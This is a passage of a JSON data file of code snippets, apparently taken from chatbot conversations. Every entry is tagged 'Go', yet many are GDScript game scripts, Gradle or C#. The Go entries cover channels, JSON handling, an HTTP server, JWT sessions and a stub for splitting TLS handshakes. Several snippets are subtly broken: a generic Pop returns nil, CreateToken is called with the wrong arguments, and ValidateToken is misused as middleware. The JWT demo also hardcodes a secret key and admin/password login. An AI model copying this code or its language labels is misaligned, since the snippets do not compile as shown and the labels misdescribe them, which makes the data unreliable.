    "code": "extends KinematicBody3D\n\nconst MAX_LIFEPOINTS := 200\n\nexport(float) var speed: float = 5.0\nexport(float) var jump_velocity: float = 4.5\nexport var lifepoints: int = MAX_LIFEPOINTS setget set_lifepoints\n\nvar gravity: float = ProjectSettings.get_setting(\"physics/3d/default_gravity\")\n\nvar game_manager\nvar attack_timer\nvar visual\nvar player_lifebar\nvar animation_tree\n\nfunc _ready():\n\tgame_manager = get_node(\"/root/GameManager\")\n\tgame_manager.player = self\n\t\n\tplayer_lifebar = get_tree().current_scene.get_node(\"HUD/PlayerLifeBar\")\n\tplayer_lifebar.max_value = MAX_LIFEPOINTS\n\tplayer_lifebar.value = lifepoints\n\t\n\tattack_timer = get_node(\"AttackCooldown\")\n\tvisual = get_node(\"Visual\")\n\tanimation_tree = get_node(\"AnimationTree\")\n\nfunc set_lifepoints(value):\n\tlifepoints = clamp(value, 0, MAX_LIFEPOINTS)\n\tplayer_lifebar.value = lifepoints\n\nfunc _process(delta):\n\tplayer_lifebar.value = lifepoints\n\nfunc _physics_process(delta):\n\tvar velocity = get_linear_velocity()\n\t\n\tif not is_on_floor():\n\t\tvelocity.y -= gravity * delta\n\t\n\tvar input_dir = Vector2(\n\t\tInput.get_action_strength(\"ui_right\") - Input.get_action_strength(\"ui_left\"),\n\t\tInput.get_action_strength(\"ui_down\") - Input.get_action_strength(\"ui_up\")\n\t).normalized()\n\tvar direction: Vector3 = global_transform.basis.xform(Vector3(input_dir.x, 0, input_dir.y)).normalized()\n\tif direction != Vector3.ZERO:\n\t\tvelocity.x = direction.x * speed\n\t\tvelocity.z = direction.z * speed\n\telse:\n\t\tvelocity.x = lerp(velocity.x, 0, delta * speed)\n\t\tvelocity.z = lerp(velocity.z, 0, delta * speed)\n\t\n\tvelocity = move_and_slide(velocity, Vector3.UP)\n\tvelocity.y = 0\n\tanimation_tree.set(\"parameters/walking/blend_amount\", velocity.clamped(1).length())\n\tif velocity.length_squared() > 0.01:\n\t\tvisual.look_at(global_transform.origin + velocity, Vector3.UP)\n\nfunc on_attack_timeout() -> void:\n\tattack_timer.start()\n\t\n\tvar nearest_enemy = game_manager.get_nearest_enemy()\n\tif nearest_enemy == null:\n\t\treturn\n\t# nearest_enemy.take_damages()\n\nfunc take_damages(damage: int) -> void:\n\tlifepoints = clamp(lifepoints - damage, 0, MAX_LIFEPOINTS)\n\nfunc heal(amount: int) -> void:\n\tlifepoints = clamp(lifepoints + amount, 0, MAX_LIFEPOINTS)",
    "filename": "9853dca9510a3677df7850f991491c6c_0.go"
  },
  {
    "conversation_hash": "2c52cebeb8aa05b245667e4c01bffc3d",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "extends CharacterBody3D\n\nconst MAX_LIFEPOINTS := 200\n\nexport var speed := 5.0\nexport var jump_velocity := 4.5\nvar _lifepoints: int = MAX_LIFEPOINTS setget , get_lifepoints\n\nvar gravity: float = ProjectSettings.get_setting(\"physics/3d/default_gravity\")\nvar _gameManager: GameManager\nvar _attackTimer: Timer\nvar _visual: Node3D\nvar _playerLifebar: ProgressBar\nvar _animationTree: AnimationTree\n\nfunc _ready():\n\t_gameManager = get_node(\"/root/GameManager\")\n\t_gameManager.player = self\n\t_playerLifebar = get_tree().current_scene.get_node(\"HUD/PlayerLifeBar\")\n\t_playerLifebar.max_value = MAX_LIFEPOINTS\n\t_playerLifebar.value = _lifepoints\n\n\t_attackTimer = get_node(\"AttackCooldown\")\n\t_visual = get_node(\"Visual\")\n\t_animationTree = get_node(\"AnimationTree\")\n\nfunc get_lifepoints() -> int:\n\treturn _lifepoints\n\nfunc _process(delta: float) -> void:\n\t_playerLifebar.value = _lifepoints\n\nfunc _physics_process(delta: float) -> void:\n\tvar velocity := get_velocity()\n\n\t# Add gravity\n\tif not is_on_floor():\n\t\tvelocity.y -= gravity * delta\n\t\n\t# Handle movement and deceleration\n\tvar input_dir := Vector2(\n\t\tInput.get_action_strength(\"move_right\") - Input.get_action_strength(\"move_left\"),\n\t\tInput.get_action_strength(\"move_back\") - Input.get_action_strength(\"move_forward\")\n\t)\n\tvar direction := (global_transform.basis.xform(Vector3(input_dir.x, 0, input_dir.y))).normalized()\n\n\tif direction != Vector3.ZERO:\n\t\tvelocity.x = direction.x * speed\n\t\tvelocity.z = direction.z * speed\n\telse:\n\t\tvelocity.x = lerp(velocity.x, 0, speed * delta)\n\t\tvelocity.z = lerp(velocity.z, 0, speed * delta)\n\n\tset_velocity(velocity)\n\tmove_and_slide()\n\n\tvelocity.y = 0.0\n\t_animationTree.set(\"parameters/walking/blend_amount\", velocity.length())\n\n\tif velocity.length() == 0.0:\n\t\treturn\n\t_visual.look_at(get_global_transform().origin + 10 * velocity, Vector3.UP)\n\nfunc _on_AttackTimeOut():\n\t_attackTimer.start()\n\tvar nearestEnemy := _gameManager.get_nearest_enemy()\n\tif nearestEnemy == null:\n\t\treturn\n\n\t# nearestEnemy.take_damages() # Call the appropriate method on nearestEnemy\n\nfunc take_damages(damages: int):\n\t_lifepoints = clamp(_lifepoints - damages, 0, MAX_LIFEPOINTS)\n\nfunc heal(heal_amount: int) -> void:\n\t_lifepoints = clamp(_lifepoints + heal_amount, 0, MAX_LIFEPOINTS)\n\nfunc _on_SwapPlane():\n\tvar sceneChangerScript = load(\"res://Scripts/Global/SceneChanger.gd\") as Script\n\tvar sceneChangerNode = get_node(\"SceneChanger\")\n\tsceneChangerNode.call(\"change_to_2d\")",
    "filename": "2c52cebeb8aa05b245667e4c01bffc3d_0.go"
  },
  {
    "conversation_hash": "8e78efa14c8bbad43fe21a3f20e45276",
    "code_index": 6,
    "language": "Go",
    "libraries": [
      "player",
      "the"
    ],
    "code": "extends CharacterBody3D\n\nenum State { IDLE, RUN, JUMP, ATTACK }\nvar state = State.IDLE\n\nvar velocity = Vector3.ZERO  # Adding velocity as a member variable\n\n@export var movement_data : MovementData\n@export var stats : Stats\n\n# References\n@onready var animation_tree : AnimationTree = $AnimationTree\n@onready var animation_state : AnimationNodeStateMachinePlayback = animation_tree.get(\"parameters/playback\")\n\nfunc _ready():\n\tanimation_tree.active = true\n\tstats.health = stats.max_health\n\nfunc _physics_process(delta):\n\tprocess_movement_input(delta)\n\tprocess_gravity(delta)\n\tprocess_actions()\n\n\t# Move and slide with snap when on floor, else without snap\n\tvar snap = Vector3.DOWN * 20 if is_on_floor() else Vector3.ZERO\n\tmove_and_slide_with_snap(velocity, snap, Vector3.UP)\n\tupdate_animation_state()\n\nfunc process_gravity(delta):\n\tif not is_on_floor():\n\t\tvelocity.y += movement_data.gravity * movement_data.gravity_scale * delta\n\telse:\n\t\tvelocity.y = -0.01  # The small sinking force to keep the player snapped to the floor\n\nfunc process_movement_input(delta):\n\tvar input_vector = Vector2(Input.get_action_strength(\"move_right\") - Input.get_action_strength(\"move_left\"),\n\t\t\t\t\t\t\t   Input.get_action_strength(\"move_back\") - Input.get_action_strength(\"move_forward\"))\n\n\tif input_vector.length() > 0:\n\t\tinput_vector = input_vector.normalized()  # Normalize input_vector if it has a length\n\t\tvar direction = Transform(basis: global_transform.basis).xform(Vector3(input_vector.x, 0, input_vector.y))\n\n\t\tstate = State.RUN\n\t\tvelocity.x = direction.x * movement_data.max_speed\n\t\tvelocity.z = direction.z * movement_data.max_speed\n\n\t\tlook_at(global_transform.origin + direction, Vector3.UP)  # Rotate player to face the direction of movement\n\telse:\n\t\tif state == State.RUN:\n\t\t\tstate = State.IDLE  # When there's no input, and we were running, switch to idle state\n\t\tvelocity.x = lerp(velocity.x, 0, movement_data.friction * delta)\n\t\tvelocity.z = lerp(velocity.z, 0, movement_data.friction * delta)\n\nfunc process_actions():\n\tif Input.is_action_just_pressed(\"jump\") and is_on_floor():\n\t\tperform_jump()\n\n\tif Input.is_action_just_pressed(\"attack\"):\n\t\tperform_attack()\n\nfunc perform_jump():\n\tvelocity.y = movement_data.jump_strength\n\tstate = State.JUMP  # Update state to JUMP when jumping is performed\n\t# Handle jump animation, sound etc.\n\nfunc perform_attack():\n\tstate = State.ATTACK  # Set state to ATTACK\n\tanimation_state.travel(\"Attack\")\n\t# Add attack logic here …\n\nfunc update_animation_state():\n\tmatch state:\n\t\tState.IDLE:\n\t\t\tanimation_state.travel(\"Idle\")\n\t\tState.RUN:\n\t\t\tanimation_state.travel(\"Run\")\n\t\tState.JUMP:\n\t\t\tif velocity.y > 0:\n\t\t\t\tanimation_state.travel(\"Jump\")\n\t\t\telse:\n\t\t\t\tanimation_state.travel(\"Fall\")\n\t\tState.ATTACK:\n\t\t\t# Assuming perform_attack will ensure the state transitions out of ATTACK when done\n\n# Override method from player base to handle damage and death\nfunc take_damage(damage: int):\n\tstats.health -= damage\n\tif stats.health <= 0:\n\t\tdie()\n\telse:\n\t\t# Play damage animation, sound etc.\n\nfunc die():\n\tstate = State.IDLE  # Consider whether you want to change animation or state after death\n\t# Play death animation, particle effect etc.\n\tqueue_free()  # Be sure you want to remove the player from the scene at this point",
    "filename": "8e78efa14c8bbad43fe21a3f20e45276_6.go"
  },
  {
    "conversation_hash": "e8ac2d3caf025fe77f287529de8c2253",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "i := 0\nfor i < 10 {\n    fmt.Println(i)\n    i++\n}",
    "filename": "e8ac2d3caf025fe77f287529de8c2253_3.go"
  },
  {
    "conversation_hash": "e8ac2d3caf025fe77f287529de8c2253",
    "code_index": 22,
    "language": "Go",
    "libraries": [],
    "code": "func sum(a []int, c chan int) {\n    total := 0\n    for _, value := range a {\n        total += value\n    }\n    c <- total // 将总和发送到通道 c\n}",
    "filename": "e8ac2d3caf025fe77f287529de8c2253_22.go"
  },
  {
    "conversation_hash": "e8ac2d3caf025fe77f287529de8c2253",
    "code_index": 23,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n)\n\nfunc main() {\n    a := []int{1, 2, 3, 4, 5, 6, 7, 8}\n    c := make(chan int)\n\n    go sum(a[:len(a)/2], c)\n    go sum(a[len(a)/2:], c)\n    x, y := <-c, <-c // 接收通道 c 中的值\n\n    fmt.Println(x, y) // 输出前半部分和后半部分的和\n}\n\nfunc sum(a []int, c chan int) {\n    total := 0\n    for _, value := range a {\n        total += value\n    }\n    c <- total // 将总和发送到通道 c\n}",
    "filename": "e8ac2d3caf025fe77f287529de8c2253_23.go"
  },
  {
    "conversation_hash": "e8ac2d3caf025fe77f287529de8c2253",
    "code_index": 24,
    "language": "Go",
    "libraries": [],
    "code": "type hchan struct {\n    qcount   uint           // 当前队列中的数据数量\n    dataqsiz uint           // 队列的大小，对于无缓冲通道是0\n    buf      unsafe.Pointer // 指向队列的头部元素的指针\n    elemsize uint16         // 每个元素的大小\n    closed   uint32         // 通道是否关闭的标志\n    elemtype *_type         // 元素的类型\n    // ... 还有其他同步和状态相关的字段\n}",
    "filename": "e8ac2d3caf025fe77f287529de8c2253_24.go"
  },
  {
    "conversation_hash": "e8ac2d3caf025fe77f287529de8c2253",
    "code_index": 26,
    "language": "Go",
    "libraries": [],
    "code": "func main() {\n    c := make(chan int)  // 创建一个传递整数的通道\n    o := make(chan bool) // 创建一个传递布尔值的通道，用于通知超时\n\n    go func() {  // 在新的 goroutine 中运行匿名函数\n        for { // 开始一个无限循环\n            select { // 使用 select 语句等待多个通道操作\n            case v := <-c: // 如果能够从 c 通道接收到数据\n                println(v) // 则打印变量 v 的值\n            case <-time.After(5 * time.Second): // 如果在 5 秒内 c 通道没有接收到数据\n                println(\"timeout\") // 打印 \"timeout\"\n                o <- true // 发送 true 到 o 通道\n                break // 跳出 select 语句，注意这里的 break 语句只能退出 select\n            }\n        }\n    }()\n    \n    <-o // 从 o 通道接收数据，如果接收到，主函数继续执行\n}",
    "filename": "e8ac2d3caf025fe77f287529de8c2253_26.go"
  },
  {
    "conversation_hash": "6c9e3fce5328d41fdb513cf0bdf6879b",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "enum State { IDLE, RUN }\n\nvar animator: AnimationPlayer\nvar state: State = State.IDLE\nvar last_ability: float = 0\nvar global_cooldown: float = 1.0\n\nfunc _read_input():\n\tvar mouse_position: Vector2 = (get_global_mouse_position() - global_position).normalized()\n\tanimator.flip_h = mouse_position.x < 0\n  \n\tvar movement = Vector2.ZERO\n\tif Input.is_action_pressed(\"move_up\"): \n\t\tmovement.y -= 1\n\tif Input.is_action_pressed(\"move_down\"): \n\t\tmovement.y += 1\t\n\tif Input.is_action_pressed(\"move_right\"): \n\t\tmovement.x += 1\n\tif Input.is_action_pressed(\"move_left\"): \n\t\tmovement.x -= 1\n\n\t# Update state based on movement\n\tstate = State.RUN if movement != Vector2.ZERO else State.IDLE\n\n\tmove.execute(self, movement)\n\tcheck_abilities()\n\n\t# Update animation based on state\n\tvar animation = \"Run\" if state == State.RUN else \"Idle\"\n\tanimator.play(animation)\n\nfunc check_abilities():\n\tvar time_since_last_ability = OS.get_ticks_msec() / 1000.0 - last_ability\n\tif time_since_last_ability > global_cooldown:\n\t\tif Input.is_action_just_pressed(\"interact\"):\n\t\t\tinteract()\n\t\telif Input.is_action_just_pressed(\"SwapPlane\"):\n\t\t\t_on_swapPlane()\n\t\telif Input.is_action_pressed(\"shoot\"):\n\t\t\tperform_attack()\n\t\treset_ability_timer() # Reset the timer after any ability\n\nfunc reset_ability_timer():\n\tlast_ability = OS.get_ticks_msec() / 1000.0\n\nfunc perform_attack():\n\tvar attack_animation = \"Attack\" + str(randi() % 2 + 1)\n\tanimator.play(attack_animation)\n\tswordslash.execute(self, get_attack_direction())\n\tawait animator.animation_looped\n\nfunc get_attack_direction() -> Vector2:\n\treturn (get_global_mouse_position() - global_position).normalized()",
    "filename": "6c9e3fce5328d41fdb513cf0bdf6879b_3.go"
  },
  {
    "conversation_hash": "6c9e3fce5328d41fdb513cf0bdf6879b",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "enum State { IDLE, RUN }\n\nvar animator: AnimationPlayer\nvar state: State = State.IDLE\nvar last_ability: float = 0\nvar global_cooldown: float = 1.0  # Assuming this is the cooldown in seconds\n\nfunc _read_input():\n\tvar mouse_position: Vector2 = (get_global_mouse_position() - global_position).normalized()\n\tanimator.flip_h = mouse_position.x < 0\n\t\n\t# Initialize movement direction list\n\tvar movement_directions = []\n\tstate = State.IDLE  # State is idle unless movement input is detected\n\n\t# Collect movement input\n\tif Input.is_action_pressed(\"move_up\"):\n\t\tmovement_directions.append(\"up\")\n\t\tstate = State.RUN\n\tif Input.is_action_pressed(\"move_down\"):\n\t\tmovement_directions.append(\"down\")\n\t\tstate = State.RUN\n\tif Input.is_action_pressed(\"move_right\"):\n\t\tmovement_directions.append(\"right\")\n\t\tstate = State.RUN\n\tif Input.is_action_pressed(\"move_left\"):\n\t\tmovement_directions.append(\"left\")\n\t\tstate = State.RUN\n\t\n\t# Execute movement if any direction is pressed\n\tif movement_directions:\n\t\tmove.execute(self, movement_directions)\n\n\t# Check and execute abilities only if cooldown has passed\n\tif OS.get_ticks_msec() / 1000.0 - last_ability > global_cooldown:\n\t\tif Input.is_action_just_pressed(\"interact\"):\n\t\t\tinteract()\n\t\t\tlast_ability = OS.get_ticks_msec() / 1000.0\n\t\tif Input.is_action_just_pressed(\"SwapPlane\"):\n\t\t\t_on_swapPlane()\n\t\t\tlast_ability = OS.get_ticks_msec() / 1000.0\n\t\tif Input.is_action_pressed(\"shoot\"):\n\t\t\t# Assuming you want to play a random attack animation each time\n\t\t\tvar attack_index = randi() % 2 + 1  # Gets either 1 or 2\n\t\t\tattack_animation = \"Attack\" + str(attack_index)\n\t\t\tanimator.play(attack_animation)\n\t\t\tswordslash.execute(self, mouse_position)\n\t\t\tlast_ability = OS.get_ticks_msec() / 1000.0\n\t\t\tawait animator.animation_looped\n\n\t# Play the appropriate animation for the current state\n\tif state == State.RUN:\n\t\tanimator.play(\"Run\")\n\telse:\n\t\tanimator.play(\"Idle\")  # Default to idle animation",
    "filename": "6c9e3fce5328d41fdb513cf0bdf6879b_4.go"
  },
  {
    "conversation_hash": "9bc355ef17baae33b1369fb11b2c0e6e",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\n   import \"fmt\"\n\n   func main() {\n       // 程序代码\n   }",
    "filename": "9bc355ef17baae33b1369fb11b2c0e6e_5.go"
  },
  {
    "conversation_hash": "9bc355ef17baae33b1369fb11b2c0e6e",
    "code_index": 8,
    "language": "Go",
    "libraries": [],
    "code": "func main() {\n       // 程序代码\n   }\n\n   main()",
    "filename": "9bc355ef17baae33b1369fb11b2c0e6e_8.go"
  },
  {
    "conversation_hash": "c609b7d59fabe7bc6a1c1015996537a0",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "type User struct {\n    ID     int\n    Name   string\n    Email  string\n    Active bool\n}\n\ntype Session struct {\n    ID         string\n    UserID     int\n    IP         string\n    UserAgent  string\n    Expiration time.Time\n}",
    "filename": "c609b7d59fabe7bc6a1c1015996537a0_0.go"
  },
  {
    "conversation_hash": "c609b7d59fabe7bc6a1c1015996537a0",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "// Adding a user to the userSlice\nuser := User{ID: 1, Name: \"John Doe\", Email: \"john.doe@example.com\", Active: true}\nuserSlice = append(userSlice, user)\n\n// Adding a session to the sessionSlice\nsession := Session{ID: \"session123\", UserID: 1, IP: \"127.0.0.1\", UserAgent: \"Mozilla/5.0\", Expiration: time.Now().Add(time.Hour)}\nsessionSlice = append(sessionSlice, session)",
    "filename": "c609b7d59fabe7bc6a1c1015996537a0_2.go"
  },
  {
    "conversation_hash": "904e7d40e29e2e7ec486ff62193b4522",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n)\n\nfunc main() {\n\tserver := http.NewServeMux()\n\tregisterRoutes(server)\n\n\terr := http.ListenAndServe(\":8080\", server)\n\tif err != nil {\n\t\tfmt.Println(\"Error starting the server:\", err)\n\t}\n}",
    "filename": "904e7d40e29e2e7ec486ff62193b4522_1.go"
  },
  {
    "conversation_hash": "904e7d40e29e2e7ec486ff62193b4522",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package session\n\nimport (\n\t\"errors\"\n\t\"fmt\"\n\t\"time\"\n\n\t\"github.com/dgrijalva/jwt-go\"\n)\n\nvar (\n\tsecretKey = []byte(\"YOUR_SECRET_KEY\")\n)\n\n// Claims defines the structure of the JWT claims.\ntype Claims struct {\n\tUserID string `json:\"userId\"`\n\tjwt.StandardClaims\n}\n\n// CreateToken generates a new JWT token for the provided user ID.\nfunc CreateToken(userID string, expirationTime time.Duration) (string, error) {\n\t// Define the expiry time for the token\n\texpiration := time.Now().Add(expirationTime)\n\n\t// Create the JWT claims\n\tclaims := &Claims{\n\t\tUserID: userID,\n\t\tStandardClaims: jwt.StandardClaims{\n\t\t\tExpiresAt: expiration.Unix(),\n\t\t},\n\t}\n\n\t// Create the token\n\ttoken := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)\n\n\t// Sign the token with the secret key\n\ttokenString, err := token.SignedString(secretKey)\n\tif err != nil {\n\t\treturn \"\", err\n\t}\n\n\treturn tokenString, nil\n}\n\n// ValidateToken verifies the authenticity of the provided JWT token.\nfunc ValidateToken(tokenString string) (string, error) {\n\t// Parse the token\n\ttoken, err := jwt.ParseWithClaims(tokenString, &Claims{}, func(token *jwt.Token) (interface{}, error) {\n\t\treturn secretKey, nil\n\t})\n\tif err != nil {\n\t\treturn \"\", err\n\t}\n\n\t// Verify the token's validity\n\tclaims, ok := token.Claims.(*Claims)\n\tif !ok || !token.Valid {\n\t\treturn \"\", errors.New(\"invalid token\")\n\t}\n\n\treturn claims.UserID, nil\n}",
    "filename": "904e7d40e29e2e7ec486ff62193b4522_3.go"
  },
  {
    "conversation_hash": "904e7d40e29e2e7ec486ff62193b4522",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\n\t\"github.com/example/session\"\n)\n\nfunc main() {\n\tserver := http.NewServeMux()\n\tregisterRoutes(server)\n\n\terr := http.ListenAndServe(\":8080\", server)\n\tif err != nil {\n\t\tfmt.Println(\"Error starting the server:\", err)\n\t}\n}\n\nfunc registerRoutes(server *http.ServeMux) {\n\tserver.HandleFunc(\"/login\", handleLogin)\n\tserver.HandleFunc(\"/protected\", session.ValidateToken(handleProtected))\n}\n\nfunc handleLogin(w http.ResponseWriter, r *http.Request) {\n\t// Validate user credentials\n\tusername := r.FormValue(\"username\")\n\tpassword := r.FormValue(\"password\")\n\n\tif isValidUser(username, password) {\n\t\t// Create a JWT token with 1 hour expiration\n\t\ttoken, err := session.CreateToken(username)\n\t\tif err != nil {\n\t\t\thttp.Error(w, \"Error creating token\", http.StatusInternalServerError)\n\t\t\treturn\n\t\t}\n\n\t\t// Return the token to the client\n\t\tw.Write([]byte(token))\n\t} else {\n\t\thttp.Error(w, \"Invalid credentials\", http.StatusUnauthorized)\n\t}\n}\n\nfunc handleProtected(w http.ResponseWriter, r *http.Request) {\n\tfmt.Fprintln(w, \"This is a protected route!\")\n}\n\nfunc isValidUser(username, password string) bool {\n\t// Implement your own validation logic\n\t// For demonstration purposes, we assume all users with username \"admin\" and password \"password\" are valid\n\treturn username == \"admin\" && password == \"password\"\n}",
    "filename": "904e7d40e29e2e7ec486ff62193b4522_5.go"
  },
  {
    "conversation_hash": "7a680723d13ceba6d9411b94c6448ab6",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "extends Node2D\n\nvar size = Vector2() # The size of the room, will be set by the dungeon generator\n\n# Adjust these paths according to your actual node structure in Room.tscn\nvar floor_sprite: Sprite # Reference to the floor sprite\nvar collision_shape: CollisionShape2D # Reference to the collision shape\n\nfunc _ready():\n\tinitialize_visuals()\n\tinitialize_collision()\n\nfunc set_room_size(new_size: Vector2):\n\tsize = new_size\n\tresize_room()\n\nfunc initialize_visuals():\n\t# Assuming there's a floor sprite that should span the entire room\n\tfloor_sprite = $FloorSprite\n\t# Here you would typically set the texture region, tile the texture, or resize it accordingly\n\t# floor_sprite.region_enabled = true\n\t# floor_sprite.region_rect = Rect2(0, 0, size.x, size.y)\n\nfunc initialize_collision():\n\tcollision_shape = $CollisionShape2D\n\nfunc resize_room():\n\t# Adjust the visuals of the room based on 'size'\n\tfloor_sprite.scale = size / floor_sprite.texture.get_size()\n\t\n\t# Adjust the collision shape of the room based on 'size'\n\t# Assuming its a RectangleShape2D\n\t# Update the following line to the actual child structure of your collision node\n\tvar shape = collision_shape.shape as RectangleShape2D\n\tshape.extents = size / 2",
    "filename": "7a680723d13ceba6d9411b94c6448ab6_2.go"
  },
  {
    "conversation_hash": "2fcf858c137ac0578b1a25c9f3f4e5a2",
    "code_index": 12,
    "language": "Go",
    "libraries": [
      "the"
    ],
    "code": "package main\n\nimport (\n\t\"crypto/tls\"\n\t\"net\"\n)\n\nfunc main() {\n\t// Listen for incoming connections.\n\tl, err := net.Listen(\"tcp\", \"localhost:443\")\n\tif err != nil {\n\t\t// handle error\n\t\treturn\n\t}\n\tdefer l.Close()\n\n\tfor {\n\t\t// Accept a new connection.\n\t\tconn, err := l.Accept()\n\t\tif err != nil {\n\t\t\t// handle error, possibly continue to next loop iteration\n\t\t\tcontinue\n\t\t}\n\n\t\t// Handle the connection in a new goroutine.\n\t\tgo handleConnection(conn)\n\t}\n}\n\nfunc handleConnection(conn net.Conn) {\n\tdefer conn.Close()\n\n\t// Read data from the connection.\n\tbuffer := make([]byte, 1024)\n\tn, err := conn.Read(buffer)\n\tif err != nil {\n\t\t// handle error\n\t\treturn\n\t}\n\n\t// ...\n\n\t// Here you would implement the logic to analyze the data,\n\t// identify handshake packets, and determine how to split them.\n\t// This would likely involve a deeper understanding of the TLS\n\t// protocol than what's provided out of the box by Go's tls package.\n\n\t// ...\n\n\t// After handling and splitting, send the parts through multiple proxy connections.\n\t// This requires setting up and managing these connections.\n\t// Reassemble on the server/receiver side to complete the TLS handshake.\n}",
    "filename": "2fcf858c137ac0578b1a25c9f3f4e5a2_12.go"
  },
  {
    "conversation_hash": "43559309d5280a8cf283ba4bff7d4aa4",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "android {\n    ...\n    defaultConfig {\n        ...\n        targetSdkVersion 34\n        ...\n    }\n\n    ...\n}\n\ndependencies {\n    ...\n    implementation \"androidx.webkit:webkit:1.4.0\" // для использования последних функций WebView\n    // Добавьте зависимости Lottie, если необходимо\n    ...\n}",
    "filename": "43559309d5280a8cf283ba4bff7d4aa4_4.go"
  },
  {
    "conversation_hash": "e5cd0feed52a45051ff540e5fdec77a8",
    "code_index": 8,
    "language": "Go",
    "libraries": [],
    "code": "enum Temperature : float\n{\n    FreezingPoint = 0,\n    BoilingPoint = 100,\n    RoomTemperature = 25.5f\n}",
    "filename": "e5cd0feed52a45051ff540e5fdec77a8_8.go"
  },
  {
    "conversation_hash": "53c6d30b47adbc4fb89d57901e398e47",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\ntype Stack[T any] []T\n\nfunc (s *Stack[T]) Push(key T) {\n    *s = append(*s, key)\n}\n\nfunc (s *Stack[T]) Pop() (T, error) {\n    l := len(*s)\n    if l == 0 {\n        return nil, fmt.Errorf(\"Stack is empty\")\n    }\n    key := (*s)[l-1]\n    *s = (*s)[:l-1]\n    return key, nil\n}\n\nfunc main() {\n    // Создание стека\n    s := Stack[int]{}\n\n    // Добавление элементов в стек\n    s.Push(1)\n    s.Push(2)\n    s.Push(3)\n\n    // Удаление элементов из стека\n    for {\n        key, err := s.Pop()\n        if err != nil {\n            fmt.Println(err)\n            break\n        }\n        fmt.Println(\"Popped:\", key)\n    }\n}",
    "filename": "53c6d30b47adbc4fb89d57901e398e47_0.go"
  },
  {
    "conversation_hash": "08ee5918eace3ee933b42a0dbbfd7a3e",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "type Person struct {\n    Name  string `json:\"name\"`\n    Age   int    `json:\"age\"`\n    Email string `json:\"email\"`\n}",
    "filename": "08ee5918eace3ee933b42a0dbbfd7a3e_0.go"
  },
  {
    "conversation_hash": "08ee5918eace3ee933b42a0dbbfd7a3e",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "file, err := os.Open(\"data.json\")\nif err != nil {\n    log.Fatal(err)\n}\ndefer file.Close()\n\nbyteValue, err := ioutil.ReadAll(file)\nif err != nil {\n    log.Fatal(err)\n}",
    "filename": "08ee5918eace3ee933b42a0dbbfd7a3e_1.go"
  },
  {
    "conversation_hash": "08ee5918eace3ee933b42a0dbbfd7a3e",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "var person Person\nerr = json.Unmarshal(byteValue, &person)\nif err != nil {\n    log.Fatal(err)\n}",
    "filename": "08ee5918eace3ee933b42a0dbbfd7a3e_2.go"
  },
  {
    "conversation_hash": "f140268ff1847a4098b4b6cb2a81845d",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "type Person struct {\n    Name   string\n    Age    int\n    Email  string\n}",
    "filename": "f140268ff1847a4098b4b6cb2a81845d_0.go"
  },
  {
    "conversation_hash": "f140268ff1847a4098b4b6cb2a81845d",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "person := Person{\n    Name:   \"John Doe\",\n    Age:    30,\n    Email:  \"john@example.com\",\n}",
    "filename": "f140268ff1847a4098b4b6cb2a81845d_1.go"
  },
  {
    "conversation_hash": "f140268ff1847a4098b4b6cb2a81845d",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "jsonData, err := json.Marshal(person)\nif err != nil {\n    fmt.Println(\"Error converting to JSON:\", err)\n    return\n}",
    "filename": "f140268ff1847a4098b4b6cb2a81845d_2.go"
  },
  {
    "conversation_hash": "f140268ff1847a4098b4b6cb2a81845d",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "file, err := os.Create(\"person.json\")\nif err != nil {\n    fmt.Println(\"Error creating file:\", err)\n    return\n}\ndefer file.Close()",
    "filename": "f140268ff1847a4098b4b6cb2a81845d_3.go"
  },
  {
    "conversation_hash": "f140268ff1847a4098b4b6cb2a81845d",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"encoding/json\"\n    \"fmt\"\n    \"os\"\n)\n\ntype Person struct {\n    Name  string\n    Age   int\n    Email string\n}\n\nfunc main() {\n    // Create a person object\n    person := Person{\n        Name:   \"John Doe\",\n        Age:    30,\n        Email:  \"john@example.com\",\n    }\n\n    // Convert to JSON\n    jsonData, err := json.Marshal(person)\n    if err != nil {\n        fmt.Println(\"Error converting to JSON:\", err)\n        return\n    }\n\n    // Open a file for writing\n    file, err := os.Create(\"person.json\")\n    if err != nil {\n        fmt.Println(\"Error creating file:\", err)\n        return\n    }\n    defer file.Close()\n\n    // Write JSON data to file\n    _, err = file.Write(jsonData)\n    if err != nil {\n        fmt.Println(\"Error writing to file:\", err)\n        return\n    }\n\n    fmt.Println(\"Data written to person.json file.\")\n}",
    "filename": "f140268ff1847a4098b4b6cb2a81845d_6.go"
  },
  {
    "conversation_hash": "dd83d088d285ee71a969ed50082fb317",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
